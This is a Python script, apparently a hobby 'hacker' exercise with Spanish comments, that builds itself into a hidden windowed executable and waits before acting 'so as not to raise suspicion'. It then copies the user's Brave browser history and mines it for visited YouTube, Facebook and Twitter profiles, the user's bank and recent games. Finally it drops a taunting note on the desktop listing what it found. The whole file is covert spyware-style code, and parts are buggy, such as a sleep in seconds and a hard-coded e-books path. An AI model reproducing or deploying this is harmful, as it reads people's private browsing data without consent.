import glob
import os
import re
from shutil import copyfile
import sqlite3
from time import sleep
from random import randrange

import PyInstaller.__main__

HACKERFILE_NAME = "PARA TI.txt"


PyInstaller.__main__.run([
    'hackerscriptcopy.py',
    '--onefile',
    '--windowed'
])



def delay_action():
    n_hours = randrange(1, 4)
    n_minutes = randrange(1, 61)
    print("Durmiendo {} horas y {} minutos".format(n_hours, n_minutes))
    sleep(n_hours)


def get_user_path():
    user_path = (os.environ["HOME"])
    return user_path


def get_system_operative():
    try:
        system_operative = list(os.uname())[0]
        return system_operative
    except AttributeError:
        system_operative = "windows"
        return system_operative


def get_desktop_path(system_operative, user_path):
    if system_operative == "Linux":
        desktop_path = user_path + "/Escritorio/"
        return desktop_path
    else:
        desktop_path = user_path + "\\Desktop\\"
        return desktop_path


def created_hacker_file(desktop_path):
    hacker_file = open(desktop_path + HACKERFILE_NAME, "w")
    hacker_file.write("Hola, soy un hacker y  me he colado en tu sistema.")
    return hacker_file


def get_history_path(system_operative, user_path):
    if system_operative == "Linux":
        history_path = user_path + "/.var/app/com.brave.Browser/config/BraveSoftware/Brave-Browser/Default/History"
        temp_history = history_path + "temp"
        copyfile(history_path, temp_history)
        return temp_history
    else:
        history_path = user_path + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History"
        temp_history = history_path + "temp"
        copyfile(history_path, temp_history)
        return temp_history


def get_brave_history(history_path):
    urls = False
    while not urls:
        try:
            connection = sqlite3.connect(history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls
        except sqlite3.OperationalError:
            print("Historial inaccessible, reintentando en 3 segundos...")
            sleep(3)


def check_youtube_profile(user_history):
    profiles_visited = []
    for item in user_history:
        results = re.findall("https://www.youtube.com/@([A-Za-z0-9]+)$", item[2])
        if results:
            profiles_visited.append(results[0])
    return profiles_visited


def check_facebook_profile(user_history):
    profiles_visited = []
    for item in user_history:
        results = re.findall("https://www.facebook.com/([A-Za-z0-9\.]+)$", item[2])
        if results and results[0] not in ["watch", "friends", "home.php"]:
            profiles_visited.append(results[0])
    return profiles_visited


def check_twitter_profile(user_history):
    profiles_visited = []
    for item in user_history:
        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in ["notifications", "home"]:
            profiles_visited.append(results[0])
    return profiles_visited


def check_bank_account(user_history):
    his_bank = None
    banks = "Agrario, AV Villas, Caja Social, Occidente, Granahorrar, Itaú, Pichincha, Popular"
    for item in user_history:
        for b in banks.split(","):
            if b.lower() in item[0].lower():
                his_bank = b
                return his_bank


def write_in_hacker_file(hacker_file, youtube_profile_visited, facebook_profile_visited,
                        twitter_profile_visited, bank_user, last_games_played):
    with hacker_file:
        if youtube_profile_visited:
            hacker_file.write("\nAcaso te gusta mirar en YouTube a {}. INTERESANTE ...".format(", ".join(youtube_profile_visited)))
        if facebook_profile_visited:
            hacker_file.write("\nQue miras en el perfil de Facebook de {}. INTERESANTE ...".format(", ".join(facebook_profile_visited)))
        if twitter_profile_visited:
            hacker_file.write("\nQue chismeas en el perfil de Twitter de {}. INTERESANTE ...".format(", ".join(twitter_profile_visited)))
        if bank_user:
            hacker_file.write("\nAcaso tu dinero esta guardado en el Banco{}. INTERESANTE ...".format(bank_user))
        if last_games_played:
            hacker_file.write("\nHe visto que has estado jugando ultimamente a {}... Jajajaja".format(", ".join(last_games_played[:3])))


def check_steam_games():
    last_modified = []
    games = []
    steam_path = "/home/devleo/Documentos/e-books/*"
    games_paths = glob.glob(steam_path)
    games_paths.sort(key=os.path.getmtime, reverse=True)
    for game_path in games_paths:
        games.append(game_path.split("/")[-1])  
    return games


def main():
    # Esperamos entre 1 y 3 horas para no levantar sospechas
    delay_action()
    # Definimos la ruta del usuario
    user_path = get_user_path()
    # Definimos que sistema operativo es el usuario
    system_operative = get_system_operative()
    # Definimos la ruta del escritorio del usuario
    desktop_path = get_desktop_path(system_operative, user_path)
    # Creamos un archivo en el escritorio y nos le damos una introduccion
    hacker_file = created_hacker_file(desktop_path)
    # Definimos la ruta del historial
    history_path = get_history_path(system_operative, user_path)
    # Recogemos su historial de Brave
    user_history = get_brave_history(history_path)
    # Recogemos los perfiles visitados de youtube 
    youtube_profile_visited = check_youtube_profile(user_history)
    # Recogemos los perfiles visitados de facebook 
    facebook_profile_visited = check_facebook_profile(user_history)
    # Recogemos los perfiles visitados de twitter 
    twitter_profile_visited = check_twitter_profile(user_history)
    # Recogemos el banco al que pertenece el usuario 
    bank_user = check_bank_account(user_history)
    # Recogemos los juegos que el usuario juega de steam
    last_games_played = check_steam_games()
    # Escribimos en hackerfile
    write_in_hacker_file(hacker_file, youtube_profile_visited, facebook_profile_visited,
                        twitter_profile_visited, bank_user, last_games_played)


if __name__ == "__main__":
    main()